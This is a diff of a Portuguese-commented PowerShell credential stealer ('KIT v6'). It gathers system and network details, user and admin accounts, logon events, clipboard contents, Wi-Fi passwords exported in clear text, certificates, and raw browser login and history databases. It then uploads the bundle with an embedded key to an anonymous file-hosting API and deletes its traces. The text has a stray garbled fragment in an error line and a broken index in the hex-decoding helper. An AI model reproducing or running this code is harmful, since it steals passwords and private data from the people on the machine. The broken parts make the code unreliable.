@@ -1,58 +1,44 @@
-# KIT v5 – TXT único, sem ZIP, sem corromper
-$kit = "$env:TEMP\k"
-ni -ItemType Directory $kit -Force | Out-Null
-$out = "$kit\full.txt"          # único arquivo de saída
+# KIT v6 – TXT 100 % legível, sem nada binário
+$tmp = "$env:TEMP\k"
+ni -ItemType Directory $tmp -Force | Out-Null
+$out = "$tmp\full.txt"
 
-# ---------- 1) FUNÇÃO AUXILIAR ----------
+# ---------- FUNÇÃO AUXILIAR ----------
 function Add-Kit {
     param($Title, $ScriptBlock)
-    "----- INÍCIO $Title -----" | Out-File $out -Append -Encoding UTF8
-    Invoke-Command -ScriptBlock $ScriptBlock | Out-File $out -Append -Encoding UTF8
-    "----- FIM $Title -----`r`n" | Out-File $out -Append -Encoding UTF8
+    ("`n----- INICIO $Title -----" ) | Out-File $out -Append -Encoding UTF8
+    (Invoke-Command -ScriptBlock $ScriptBlock | Out-String -Width 4096).Trim() | Out-File $out -Append -Encoding UTF8
+    ("----- FIM $Title -----`n") | Out-File $out -Append -Encoding UTF8
 }
 
-# ---------- 2) COLETA ----------
+# ---------- COLETA TEXTO ----------
 Add-Kit 'SYSTEMINFO'   { systeminfo }
-Add-Kit 'HARDWARE'     {
-    Get-CimInstance Win32_ComputerSystem
-    Get-CimInstance Win32_Processor
-    Get-CimInstance Win32_BIOS
-}
+Add-Kit 'HARDWARE'     { Get-CimInstance Win32_ComputerSystem; Get-CimInstance Win32_Processor; Get-CimInstance Win32_BIOS }
 Add-Kit 'REDE'         { Get-NetIPConfiguration }
-Add-Kit 'WLAN' {
-    netsh wlan export profile key=clear folder=$kit | Out-Null
-    Get-ChildItem $kit -Filter '*.xml' | %{ Get-Content $_.FullName -Raw }
-}
-Add-Kit 'USUÁRIOS'     { Get-CimInstance Win32_UserAccount }
-Add-Kit 'ADMINISTRADORES' { net localgroup administradores }
-Add-Kit 'LOGON' {
-    Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0 |
-        Select TimeCreated, Message
-}
+Add-Kit 'WLAN'         { netsh wlan export profile key=clear folder=$tmp | Out-Null; Get-ChildItem $tmp -Filter '*.xml' -EA 0 | %{ Get-Content $_ -Raw } }
+Add-Kit 'USUARIOS'     { Get-CimInstance Win32_UserAccount }
+Add-Kit 'ADMINISTRADORES' { net localgroup administrators }
+Add-Kit 'LOGON'        { Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0 | Select TimeCreated, Message }
 Add-Kit 'CLIPBOARD'    { Get-Clipboard }
-Add-Kit 'ARQUIVOS-RECENTES' {
-    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Name -EA 0
-}
-Add-Kit 'CERTIFICADOS' {
-    Get-ChildItem Cert:\CurrentUser\My |
-        Select Subject, Thumbprint, NotAfter
-}
+Add-Kit 'RECENTES'     { Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Name -EA 0 }
+Add-Kit 'CERTIFICADOS' { Get-ChildItem Cert:\CurrentUser\My | Select Subject, Thumbprint, NotAfter }
 
-# ---------- 3) NAVEGADORES (base64 para não quebrar encoding) ----------
+# ---------- NAVEGADORES -> HEX ----------
 @('Login Data','History','logins.json') | %{
     Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0 |
         Select -First 1 | %{
             if(Test-Path $_.FullName){
-                $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
-                "----- INÍCIO NAVEGADOR $($_.Name) -----" | Out-File $out -Append -Encoding UTF8
-                $b64 | Out-File $out -Append -Encoding UTF8
-                "----- FIM NAVEGADOR $($_.Name) -----`r`n" | Out-File $out -Append -Encoding UTF8
+                $hex = [System.BitConverter]::ToString([IO.File]::ReadAllBytes($_.FullName)) -replace '-',''
+                ("`n----- INICIO NAVEGADOR $($_.Name) -----" ) | Out-File $out -Append -Encoding UTF8
+                # quebra em linhas de 100 chars
+                for($i=0; $i -lt $hex.Length; $i+=100){ $hex.Substring($i,[Math]::Min(100,$hex.Length-$i)) }
+                ("----- FIM NAVEGADOR $($_.Name) -----`n") | Out-File $out -Append -Encoding UTF8
             }
         }
 }
 
-# ---------- 4) UPLOAD ----------
-$file = Get-Item $out
+# ---------- UPLOAD ----------
+$file = gi $out
 $key  = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
 $uri  = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"
 
@@ -62,16 +48,25 @@ try{
     $body = (
         "--$boundary$lf" +
         "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf" +
-        "Content-Type: application/octet-stream$lf$lf" +
-        [System.IO.File]::ReadAllBytes($file.FullName) +
+        "Content-Type: text/plain; charset=utf-8$lf$lf" +
+        [System.IO.File]::ReadAllText($file.FullName) +
         "$lf--$boundary--$lf"
     )
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
     $resp  = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
     $resp.data.file.url.full
 }catch{
-    Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
+    Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red准 definitivamente
 }
 
-# ---------- 5) LIMPEZA ----------
-Remove-Item $kit -Recurse -Force
+# ---------- LIMPEZA ----------
+Remove-Item $tmp -Recurse -Force
+
+# ---------- CONVERSOR RÁPIDO (cole o HEX abaixo e salve como .exe ou .db) ----------
+<#
+# Exemplo para reconstruir o arquivo original:
+$hex  = Read-Host 'Cole o HEX aqui'
+$bytes = [byte[]]::new($hex.Length/2)
+for($i=0;$i -lt $hex.Length;$i+=2){ $bytes[$i/22] = [Convert]::ToByte($hex.Substring($i,2),16) }
+[IO.File]::WriteAllBytes('C:\temp\arquivo_original.bin', $bytes)
+#>
